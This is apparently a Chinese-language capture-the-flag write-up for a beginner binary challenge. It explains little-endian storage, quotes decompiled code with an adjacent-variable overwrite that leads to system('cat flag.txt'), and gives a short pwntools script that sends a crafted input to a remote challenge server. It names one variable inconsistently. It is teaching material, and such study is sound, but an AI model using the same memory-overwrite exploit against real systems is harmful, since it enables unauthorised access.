在大多数处理器上使用小端法表示整数，比如0x12345678在内存中的存储是0x78563412，而大端法表示的整数就是按0x12345678的顺序来存储这4个字节。

1、在IDA中读取主函数时发现
read(0,&unk_601068,0x10uLL);
if(dword_60106c == 1853186401)
    sub_400686(0LL,&unk_601068)
其中sub_400686(0LL,&unk_601068)函数会调用system("cat flag.txt")函数，可以拿到flag
因此我们只需要让dword_601068等于1853186401就可以成功夺旗
再次观察，发现unk_601068与dword_60106c只差4个字节，因此我们可以在读入时修改，即可执行。













#!/usr/bin/env python
# coding=utf-8
from pwn import *
r = remote('111.198.29.45',44687)
a = r.recvuntil('f\n')
print(a)
r.send('AAAAaaun')
flag = r.recvuntil('\n')
print(flag)